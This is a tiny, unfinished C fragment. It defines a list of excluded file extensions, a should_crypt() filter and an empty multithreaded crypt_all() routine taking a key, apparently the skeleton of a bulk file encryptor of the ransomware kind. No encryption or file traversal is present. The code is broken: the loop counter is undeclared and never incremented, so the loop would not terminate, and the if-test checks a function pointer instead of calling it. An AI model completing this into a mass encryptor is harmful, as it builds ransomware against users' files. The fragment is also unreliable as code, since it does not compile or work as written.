char *exclude[]={".pdf",".txt"};

int should_crypt(char *file)
{
for(i=0;i!=sizeof(exclude)/sizeof(char*))
{
if(strstr(file,exclude[i])!=NULL)
{
return 0;
}
}
return 1;
}

void crypt_all(int numthreads,char *key)
{

if(should_crypt)
{


}



}
